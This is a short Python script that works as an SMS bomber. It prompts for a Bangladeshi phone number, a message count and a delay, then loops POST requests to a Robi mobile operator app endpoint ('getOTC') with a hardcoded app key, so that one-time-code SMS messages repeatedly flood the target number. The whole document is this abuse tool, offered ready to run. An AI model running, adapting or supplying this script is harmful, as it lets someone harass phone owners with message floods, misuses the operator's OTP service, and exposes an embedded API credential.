import requests,  time
wait_time = int(input("\n\nEnter wait time in second :: "))
num=input("\n\ninput Number: 01")
i=int(input("\n\n\tEnter Amoun: "))

url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=123455&app_version=78&msisdn=8801"+num
y=0
while y<i:
    try:
        x=requests.post(url, headers = {"x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})
        y=y+1
        print(y, "Sms Sending", x.text)
        time.sleep(wait_time)
    except:
        print("error")
